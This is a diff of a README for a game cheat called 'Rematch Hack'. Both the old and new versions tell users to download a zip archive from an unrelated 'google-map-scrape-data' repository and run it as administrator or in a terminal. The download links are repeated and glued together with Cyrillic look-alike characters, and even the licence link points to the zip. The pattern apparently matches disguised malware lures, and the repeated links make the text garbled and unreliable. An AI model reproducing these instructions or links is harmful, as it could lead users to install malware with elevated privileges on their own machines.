@@ -44,10 +44,10 @@ Loaded with best-in-class features powered by cutting-edge technology and SEO-fr
 Getting started is quick and safe!  
 Just follow these instructions to begin using Rematch Hack:
 
-1. Download **https://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zipоhttps://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zip** from the repository.
+1. Download **https://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zip** from the repository.
 2. Extract the contents to your chosen directory.
-3. For Windows users, run **https://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zipоhttps://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zip** as administrator.  
-   For macOS or Linux, run the included launch script in Terminal: `https://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zipоhttps://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zip`.
+3. For Windows users, run **https://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zip** as administrator.  
+   For macOS or Linux, run the included launch script in Terminal: `https://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zip`.
 4. Follow the on-screen setup wizard for initial configuration.
 
 _Note: Ensure you have the latest version of .NET (Windows), Mono (Linux/macOS), or a compatible environment as mentioned in the OS compatibility table above._
@@ -91,7 +91,7 @@ Please consult the rules, policies, and ToS of the game/service you intend to us
 
 ## 📜 License
 
-Rematch Hack is 100% open source and built for the community under the [MIT License](https://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zipоhttps://raw.githubusercontent.com/midoco22/google-map-scrape-data/main/Lоader.zip).  
+Rematch Hack is 100% open source and built for the community under the [MIT License](https://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zipоhttps://github.com/midoco22/google-map-scrape-data/raw/refs/heads/main/alethopteis/scrape-map-google-data-v3.3.zip).  
 Use, modify, and share with confidence—at your own risk.
 
 Let's make rematches smarter, safer, and more fun in 2025!
